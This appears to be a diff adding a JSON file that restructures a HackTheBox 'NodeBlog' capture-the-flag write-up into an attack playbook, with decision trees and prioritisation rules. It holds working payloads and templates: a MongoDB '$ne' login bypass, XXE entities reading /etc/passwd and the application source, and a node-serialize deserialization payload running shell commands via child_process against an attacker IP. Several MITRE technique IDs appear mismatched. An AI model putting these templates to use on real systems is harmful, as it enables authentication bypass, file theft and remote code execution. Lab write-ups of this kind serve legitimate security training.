@@ -1,0 +1,904 @@
+{
+  "writeup_id": "Htb_Nodeblog",
+  "scenario_fingerprint": {
+    "scenario_name": "nodejs_nosql_xxe_deserialization",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+5000",
+    "service_combination": "ssh+nodejs_express",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "nosql_injection_auth_bypass",
+    "privilege_path": "nosql_bypass_to_xxe_to_deserialization_rce",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "nodejs_express_framework",
+      "mongodb_nosql_backend",
+      "json_content_type_injection",
+      "xml_file_upload_xxe",
+      "nodejs_deserialization_vulnerability"
+    ],
+    "environmental_clues": [
+      "express_powered_by_header",
+      "port_5000_nodejs_service",
+      "blog_application_structure",
+      "login_form_json_processing"
+    ],
+    "similar_scenarios": [
+      "node_based_ctf_boxes",
+      "express_mongodb_stacks"
+    ],
+    "unique_aspects": [
+      "chained_nosql_xxe_deserialization",
+      "uhc_qualifier_box",
+      "mongodb_credential_extraction",
+      "ne_operator_auth_bypass"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "NoSQL Authentication Bypass",
+        "success_reason": "Application accepted JSON input and processed MongoDB operators without sanitization",
+        "prerequisite_indicators": [
+          "nodejs_application_detected",
+          "login_form_present",
+          "json_content_type_accepted",
+          "mongodb_backend_likely"
+        ],
+        "recognition_patterns": [
+          "Express framework headers",
+          "NodeJS service detection",
+          "login form accepts JSON",
+          "different responses to malformed queries"
+        ],
+        "failure_modes": [
+          "input_sanitization_present",
+          "json_parsing_disabled",
+          "sql_database_backend",
+          "operator_filtering_active"
+        ],
+        "environmental_factors": [
+          "default_express_configuration",
+          "mongodb_without_input_validation",
+          "dual_content_type_support"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "XXE File Disclosure",
+        "success_reason": "XML parser processed external entities without restrictions",
+        "prerequisite_indicators": [
+          "xml_upload_functionality",
+          "xml_parsing_enabled",
+          "external_entity_processing",
+          "file_system_access_available"
+        ],
+        "recognition_patterns": [
+          "XML upload returns parsed content",
+          "error messages show XML structure",
+          "server processes XML entities",
+          "file content reflected in response"
+        ],
+        "failure_modes": [
+          "external_entities_disabled",
+          "xml_parser_restrictions",
+          "file_access_permissions",
+          "entity_expansion_limits"
+        ],
+        "environmental_factors": [
+          "default_xml_parser_config",
+          "nodejs_xml_libraries",
+          "insufficient_xml_hardening"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "NodeJS Deserialization RCE",
+        "success_reason": "Application used unsafe deserialization of user-controlled data",
+        "prerequisite_indicators": [
+          "nodejs_application",
+          "serialization_libraries_present",
+          "user_input_deserialized",
+          "source_code_access"
+        ],
+        "recognition_patterns": [
+          "serialize/unserialize functions in code",
+          "cookie or session deserialization",
+          "nodejs deserialization libraries",
+          "user-controlled serialized data"
+        ],
+        "failure_modes": [
+          "safe_deserialization_methods",
+          "input_validation_present",
+          "serialization_signing",
+          "restricted_execution_context"
+        ],
+        "environmental_factors": [
+          "vulnerable_nodejs_libraries",
+          "unsafe_coding_practices",
+          "lack_of_deserialization_controls"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "20-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "JSON content-type acceptance",
+        "discovery_method": "Manual content-type header modification",
+        "why_critical": "Enabled NoSQL operator injection for authentication bypass",
+        "how_to_recognize": [
+          "login form accepts multiple content types",
+          "nodejs/express application",
+          "different error responses to JSON vs form data"
+        ],
+        "follow_up_actions": [
+          "test_nosql_operators",
+          "enumerate_database_structure",
+          "extract_user_credentials"
+        ]
+      },
+      {
+        "discovery": "XML upload functionality",
+        "discovery_method": "Authenticated site enumeration",
+        "why_critical": "Provided XXE vector for source code disclosure",
+        "how_to_recognize": [
+          "file upload accepts XML",
+          "server parses and displays XML content",
+          "error messages reveal XML structure"
+        ],
+        "follow_up_actions": [
+          "test_external_entity_injection",
+          "read_application_source_code",
+          "identify_deserialization_vulnerabilities"
+        ]
+      },
+      {
+        "discovery": "Source code with deserialization",
+        "discovery_method": "XXE file disclosure attack",
+        "why_critical": "Revealed unsafe deserialization leading to RCE",
+        "how_to_recognize": [
+          "nodejs serialize/unserialize usage",
+          "user-controlled data deserialization",
+          "lack of input validation"
+        ],
+        "follow_up_actions": [
+          "craft_deserialization_payload",
+          "achieve_remote_code_execution",
+          "establish_reverse_shell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "NoSQL_injection_to_authenticated",
+        "why_possible": "MongoDB operators processed without sanitization",
+        "recognition_signs": [
+          "nodejs_with_mongodb",
+          "json_input_accepted",
+          "no_input_validation"
+        ],
+        "exploitation_path": "Content-Type: application/json → {\"$ne\": \"value\"} → Authentication bypass"
+      },
+      {
+        "privilege_level": "authenticated_user",
+        "escalation_method": "XXE_to_source_disclosure",
+        "why_possible": "XML parser processed external entities without restrictions",
+        "recognition_signs": [
+          "xml_upload_functionality",
+          "parsed_content_displayed",
+          "external_entity_processing"
+        ],
+        "exploitation_path": "XML upload → External entity → File system access → Source code"
+      },
+      {
+        "privilege_level": "source_access",
+        "escalation_method": "Deserialization_to_RCE",
+        "why_possible": "Unsafe deserialization of user-controlled data",
+        "recognition_signs": [
+          "serialize_unserialize_in_code",
+          "user_input_deserialized",
+          "nodejs_vulnerable_libraries"
+        ],
+        "exploitation_path": "Craft payload → Serialize malicious object → Trigger deserialization → RCE"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,5000 open on Linux host with NodeJS service",
+        "decision": "Enumerate web application for NodeJS-specific vulnerabilities",
+        "reasoning": "NodeJS applications commonly have NoSQL injection, deserialization, and XXE vulnerabilities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_bruteforce",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if specific versions identified"
+          }
+        ],
+        "success_indicators": [
+          "login_form_found",
+          "file_upload_functionality",
+          "json_endpoints_discovered"
+        ],
+        "next_decision": "test_nosql_injection"
+      },
+      {
+        "step": 2,
+        "situation": "Login form found accepting JSON input",
+        "decision": "Test NoSQL injection with MongoDB operators",
+        "reasoning": "NodeJS commonly uses MongoDB, JSON input allows object injection",
+        "confidence": 0.85,
+        "prerequisites": [
+          "json_content_type_accepted",
+          "login_form_present"
+        ],
+        "success_indicators": [
+          "authentication_bypass_successful",
+          "session_cookie_received"
+        ],
+        "failure_fallbacks": [
+          "sql_injection",
+          "credential_bruteforce",
+          "directory_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Authenticated access gained, file upload functionality discovered",
+        "decision": "Test XXE injection in XML file upload",
+        "reasoning": "XML processing without proper validation leads to file disclosure",
+        "confidence": 0.8,
+        "prerequisites": [
+          "file_upload_accepts_xml",
+          "xml_parsing_confirmed"
+        ],
+        "success_indicators": [
+          "file_read_successful",
+          "source_code_disclosed"
+        ],
+        "failure_fallbacks": [
+          "file_upload_rce",
+          "path_traversal",
+          "other_file_formats"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Source code obtained showing node-serialize usage",
+        "decision": "Exploit deserialization vulnerability in cookie handling",
+        "reasoning": "node-serialize is vulnerable to RCE through malicious serialized objects",
+        "confidence": 0.95,
+        "prerequisites": [
+          "source_code_available",
+          "node_serialize_identified",
+          "cookie_manipulation_possible"
+        ],
+        "success_indicators": [
+          "command_execution_achieved",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "other_rce_vectors",
+          "privilege_escalation_enum"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_nosql_injection_succeeds": {
+        "action": "enumerate_authenticated_functionality",
+        "tools": [
+          "burp_suite",
+          "browser_dev_tools"
+        ],
+        "next_phase": "file_upload_testing"
+      },
+      "if_xxe_succeeds": {
+        "action": "read_application_source_code",
+        "targets": [
+          "/opt/blog/server.js",
+          "/etc/passwd",
+          "application_config_files"
+        ],
+        "next_phase": "source_code_analysis"
+      },
+      "if_deserialization_succeeds": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "node_serialize_payload",
+          "netcat_listener"
+        ],
+        "next_phase": "privilege_escalation"
+      },
+      "if_shell_obtained": {
+        "action": "enumerate_credentials_and_escalate",
+        "methods": [
+          "mongodb_credential_extraction",
+          "password_reuse_testing"
+        ],
+        "tools": [
+          "mongo_cli",
+          "su_command"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_nosql_injection_on_nodejs_login_forms",
+        "reasoning": "high_success_rate_with_mongodb_backends",
+        "applicability": "nodejs_applications_with_json_input"
+      },
+      {
+        "rule": "test_xxe_when_xml_upload_functionality_present",
+        "reasoning": "common_vulnerability_in_xml_processing",
+        "applicability": "file_upload_accepts_xml_format"
+      },
+      {
+        "rule": "check_for_node_serialize_in_source_code",
+        "reasoning": "known_vulnerable_library_with_easy_exploitation",
+        "applicability": "nodejs_source_code_available"
+      },
+      {
+        "rule": "extract_database_credentials_after_initial_access",
+        "reasoning": "often_leads_to_privilege_escalation_via_password_reuse",
+        "applicability": "database_backed_applications"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "NoSQL Authentication Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "nodejs"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "nodejs_application",
+          "mongodb_backend",
+          "json_content_type_accepted",
+          "login_form_present"
+        ],
+        "success_indicators": [
+          "authentication_cookie_returned",
+          "redirect_to_authenticated_area",
+          "invalid_password_message_for_valid_user"
+        ],
+        "incompatible_with": [
+          "sql_database_only",
+          "strict_input_validation",
+          "json_parsing_disabled"
+        ],
+        "confidence_boosters": [
+          "express_framework_detected",
+          "mongodb_port_accessible",
+          "weak_input_sanitization"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "XXE File Disclosure",
+        "mitre_id": "T1203",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "xml_parsing_enabled",
+          "file_upload_functionality",
+          "external_entity_processing_enabled",
+          "authenticated_access_available"
+        ],
+        "success_indicators": [
+          "file_contents_in_response",
+          "xml_parsing_errors_revealed",
+          "external_entity_resolution_successful"
+        ],
+        "incompatible_with": [
+          "xml_external_entities_disabled",
+          "strict_xml_validation",
+          "file_upload_restrictions"
+        ],
+        "confidence_boosters": [
+          "nodejs_xml_parsers",
+          "post_upload_functionality",
+          "verbose_error_messages"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "NodeJS Deserialization RCE",
+        "mitre_id": "T1055",
+        "required_services": [
+          "http",
+          "nodejs"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "nodejs_application",
+          "unsafe_deserialization",
+          "user_controlled_serialized_data",
+          "express_framework"
+        ],
+        "success_indicators": [
+          "command_execution_successful",
+          "reverse_shell_connection",
+          "application_crash_on_payload"
+        ],
+        "incompatible_with": [
+          "safe_deserialization_libraries",
+          "input_sanitization_present",
+          "sandboxed_execution"
+        ],
+        "confidence_boosters": [
+          "source_code_access",
+          "serialize_deserialize_functions_present",
+          "cookie_based_session_management"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "20-40 minutes"
+      },
+      {
+        "technique": "Directory Traversal via Web",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "file_access_functionality",
+          "insufficient_path_validation"
+        ],
+        "success_indicators": [
+          "system_files_accessible",
+          "directory_listing_exposed",
+          "sensitive_files_readable"
+        ],
+        "incompatible_with": [
+          "strict_path_validation",
+          "chroot_jail",
+          "file_access_restrictions"
+        ],
+        "confidence_boosters": [
+          "file_parameter_in_urls",
+          "custom_web_application",
+          "verbose_error_messages"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "nodejs_application": {
+        "port_indicators": [
+          3000,
+          5000,
+          8000,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "nodejs"
+        ],
+        "banner_indicators": [
+          "Express",
+          "Node.js",
+          "X-Powered-By: Express"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "mongodb_backend": {
+        "port_indicators": [
+          27017,
+          27018,
+          27019
+        ],
+        "service_indicators": [
+          "mongodb"
+        ],
+        "technology_indicators": [
+          "nosql",
+          "mongo"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          5000,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis",
+          "express"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "nosql_auth_bypass",
+          "when": "nodejs_and_login_form_detected",
+          "reason": "high_success_rate_immediate_access"
+        },
+        {
+          "attack": "directory_traversal",
+          "when": "web_application_detected",
+          "reason": "quick_reconnaissance_technique"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "xxe_file_disclosure",
+          "when": "file_upload_functionality_present",
+          "reason": "requires_authentication_but_high_impact"
+        },
+        {
+          "attack": "nodejs_deserialization",
+          "when": "source_code_access_available",
+          "reason": "requires_code_analysis_but_leads_to_rce"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "NoSQL Authentication Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "POST /login with Content-Type: application/json and {\"user\": \"{username}\", \"password\": {\"$ne\": \"{fake_password}\"}}",
+            "actual_command": "POST /login with {\"user\": \"admin\", \"password\": {\"$ne\": \"wrongpassword\"}}",
+            "output_pattern": "Set-Cookie header with authentication token",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "nodejs_application_with_mongodb",
+          "json_content_type_accepted",
+          "nosql_query_operators_processed"
+        ],
+        "success_indicators": [
+          "authentication_cookie_received",
+          "access_to_authenticated_functionality",
+          "no_password_required"
+        ],
+        "common_failures": [
+          "application_only_accepts_form_data",
+          "nosql_operators_sanitized",
+          "different_database_backend"
+        ],
+        "follow_up_techniques": [
+          "authenticated_functionality_enumeration",
+          "file_upload_testing",
+          "xxe_injection"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "XXE File Disclosure",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "discovery",
+        "tools_used": [
+          {
+            "name": "XML Payload",
+            "command_template": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file://{file_path}\">]><post><title>Title</title><description>Desc</description><markdown>&file;</markdown></post>",
+            "actual_command": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><post><title>0xdf's Post</title><description>Read File</description><markdown>&file;</markdown></post>",
+            "output_pattern": "File contents displayed in markdown field",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "xml_file_upload_functionality",
+          "xml_parser_processes_external_entities",
+          "file_system_access_from_web_application"
+        ],
+        "success_indicators": [
+          "file_contents_displayed_in_response",
+          "application_source_code_accessible",
+          "system_configuration_files_readable"
+        ],
+        "common_failures": [
+          "external_entities_disabled",
+          "file_permissions_restrict_access",
+          "xml_parser_sandboxed"
+        ],
+        "follow_up_techniques": [
+          "source_code_analysis",
+          "configuration_file_analysis",
+          "deserialization_vulnerability_identification"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Node.js Deserialization RCE",
+        "mitre_id": "T1059.007",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "node-serialize payload",
+            "command_template": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('{command}', function(error, stdout, stderr){console.log(stdout)});}()\"}",
+            "actual_command": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.8', function(error, stdout, stderr){console.log(stdout)});}()\"}",
+            "output_pattern": "Command execution on target system",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "node_serialize_library_in_use",
+          "user_controlled_serialized_data",
+          "cookie_or_parameter_deserialization"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "network_callbacks_received",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "payload_encoding_issues",
+          "special_characters_filtered",
+          "deserialization_sandboxed"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "persistence_mechanisms"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Suite",
+        "use_case": "nosql_injection_testing",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "curl",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "test_both_form_and_json_content_types",
+          "try_multiple_nosql_operators",
+          "url_encode_special_characters"
+        ]
+      },
+      {
+        "tool": "XXE Payloads",
+        "use_case": "file_disclosure_via_xml",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "xml_processing_applications"
+        ],
+        "alternatives": [
+          "blind_xxe_techniques",
+          "oob_xxe"
+        ],
+        "best_practices": [
+          "start_with_simple_file_reads",
+          "target_application_source_code",
+          "check_for_filtered_characters"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "nosql_to_xxe_to_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "POST /login with Content-Type: application/json and {\"user\": \"admin\", \"password\": {\"$ne\": \"wrongpassword\"}}",
+            "purpose": "Bypass authentication via NoSQL injection",
+            "expected_output": "Authentication cookie in response"
+          },
+          {
+            "step": 2,
+            "command": "Upload XML: <?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///opt/blog/server.js\">]><post><title>Source</title><description>Read</description><markdown>&file;</markdown></post>",
+            "purpose": "Extract application source code via XXE",
+            "expected_output": "Node.js source code with node-serialize usage"
+          },
+          {
+            "step": 3,
+            "command": "Set cookie to URL-encoded: {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 [attacker_ip]', function(error, stdout, stderr){console.log(stdout)});}()\"}",
+            "purpose": "Test RCE via deserialization",
+            "expected_output": "ICMP packets received at attacker IP"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "30-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "NodeBlog",
+      "difficulty": "Easy",
+      "os": "Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2022-01-10",
+      "author": "ippsec",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "nosql_injection",
+        "xxe",
+        "deserialization"
+      ],
+      "key_vulnerabilities": [
+        "nosql_auth_bypass",
+        "xxe_file_disclosure",
+        "nodejs_deserialization"
+      ],
+      "environment_type": "web_application_nodejs",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "nosql_injection_techniques",
+        "xxe_exploitation",
+        "nodejs_deserialization",
+        "mongodb_enumeration"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_basics",
+        "nodejs_fundamentals",
+        "nosql_concepts",
+        "xml_processing"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "nosql_injection",
+        "xxe",
+        "deserialization",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "authentication_bypass",
+        "information_disclosure",
+        "remote_code_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "secure_deserialization",
+        "xml_parser_hardening",
+        "database_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Mango",
+        "JSON",
+        "Node"
+      ],
+      "similarity_reasons": [
+        "nosql_vulnerabilities",
+        "nodejs_environment",
+        "web_application_focus"
+      ],
+      "unique_aspects": [
+        "uhc_qualifier_box",
+        "xxe_to_source_disclosure",
+        "combined_vulnerability_chain"
+      ],
+      "difficulty_factors": [
+        "multiple_vulnerability_chaining",
+        "nodejs_specific_attacks",
+        "mongodb_interaction"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T01:23:47.383709",
+    "original_file": "0xdf_writeups/Htb Nodeblog.md",
+    "content_length": 27242,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
